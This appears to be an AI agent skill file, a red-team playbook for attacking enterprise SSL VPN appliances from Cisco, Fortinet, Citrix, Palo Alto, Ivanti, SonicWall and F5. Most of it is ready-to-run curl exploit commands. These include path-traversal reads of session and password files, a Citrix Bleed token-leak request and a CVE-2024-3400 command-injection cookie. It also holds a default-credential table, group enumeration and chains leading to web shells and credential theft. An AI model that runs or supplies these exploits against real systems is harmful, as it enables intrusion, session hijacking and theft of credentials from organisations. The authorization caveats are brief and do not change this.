---
name: enterprise-vpn-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [vpn, enterprise, attack, redteam]
  category: redteam
---

## When to Use

- The target exposes an SSL VPN or remote-access appliance (Cisco ASA/AnyConnect, Fortinet, Citrix ADC, Palo Alto GlobalProtect, Pulse/Ivanti, SonicWall, F5).
- Recon shows `+CSCOE+` paths, VPN-style hosts (`vpn.*`, `connect.*`, `webvpn.*`, `remote.*`), appliance cookies (`webvpn=`, `SVPNCOOKIE=`, `NSC_AAA=`, `DSAuthSession=`, `BIGipServer*`), or management ports 443/4443/10443/8888.
- Login pages return appliance banners such as "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", or "Ivanti".

Do not use for internal lateral movement after a foothold, VPN client-side bugs, or IPsec/L2TP/OpenVPN (different protocols, not the SSL VPN web stack).

## Prerequisites

- Explicit authorization, target boundaries, and rate limits for the target.
- Tooling: `curl`, `nuclei`, `python3`.
- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.

## How to Run

```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```

## Procedure

The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl --max-time 30 --connect-timeout 10 -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl --max-time 30 --connect-timeout 10 -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl --max-time 30 --connect-timeout 10 -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl --max-time 30 --connect-timeout 10 -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl --max-time 30 --connect-timeout 10 -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl --max-time 30 --connect-timeout 10 -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## CVE matrix — pre-auth or auth-bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |

```bash
# Cisco CVE-2020-3452 — file read
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |

```bash
# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
# If response is large (>10KB) and contains random memory contents — vulnerable
# Session tokens often present in the memory dump

# CVE-2019-19781 file read
curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |

```bash
# CVE-2024-3400 detection
curl --max-time 30 --connect-timeout 10 -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'
# Look for file-creation side-effect on test path — palo creates file with command output
```

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |

```bash
# CVE-2019-11510 — Pulse file read
curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl --max-time 30 --connect-timeout 10 -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl --max-time 30 --connect-timeout 10 -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 --connect-timeout 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Add `-as` (auto-scan) for broader vuln coverage but slower.

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Pitfalls

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure; use `-rl 5` or lower
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface
- **Don't run pre-auth RCE PoCs without explicit authorization** — accidentally crashing a VPN concentrator is catastrophic. Detection-only tests first.
- **Don't trust HTTP status codes alone** — patched appliances may return 200 on known-vulnerable paths but serve different content. Diff the response body against a baseline.
- **Don't assume one vendor** — many enterprises run multiple VPN appliances (Cisco + Citrix, Fortinet + Pulse). Fingerprint all before selecting attack paths.
- **Don't ignore the AAA backend** — knowing whether the VPN uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths completely.
- **Lockout risk on default credentials** — most enterprise targets have changed factory passwords. Test ≤2 attempts per account.
- **VPN appliances generate noisy logs** — every probe is likely logged to SIEM. Jitter timing between requests; don't rapid-fire.

---

## Verification

Run this self-test to confirm VPN appliance fingerprinting works:

1. **Cisco ASA fingerprint** — confirm path detection syntax:
   ```bash
   curl --max-time 30 --connect-timeout 10 -skI "https://vpn.example.com/+CSCOE+/logon.html" -o /dev/null -w "HTTP %{http_code}
" 2>/dev/null && echo "(test probe sent)"
   ```

2. **Fortinet path probe** — confirm FortiOS path syntax:
   ```bash
   curl --max-time 30 --connect-timeout 10 -skI "https://vpn.example.com/remote/login" -o /dev/null -w "HTTP %{http_code}
" 2>/dev/null && echo "(test probe sent)"
   ```

3. **CVE-2020-3452 probe syntax** — confirm Cisco file-read path construction:
   ```bash
   echo "https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua" | grep -q "+CSCOE+" && echo "PASS: CVE path syntax correct" || echo "FAIL"
   ```

4. **CVE-2018-13379 probe syntax** — confirm Fortinet path-traversal construction:
   ```bash
   echo "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" | grep -q "fgt_lang" && echo "PASS: Fortinet path syntax correct" || echo "FAIL"
   ```

5. **Citrix Bleed probe syntax** — confirm Host header overflow pattern:
   ```bash
   echo "POST /oauth/idp/.well-known/openid-configuration" | grep -q "openid-configuration" && echo "PASS: Citrix Bleed endpoint syntax correct" || echo "FAIL"
   ```

6. **SAML metadata probe** — confirm metadata endpoint syntax:
   ```bash
   echo "/+CSCOE+/saml/sp/metadata /remote/saml/metadata" | grep -q "saml" && echo "PASS: SAML metadata paths present" || echo "FAIL"
   ```

All 6 tests verify the VPN fingerprinting and CVE detection syntax.

---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.
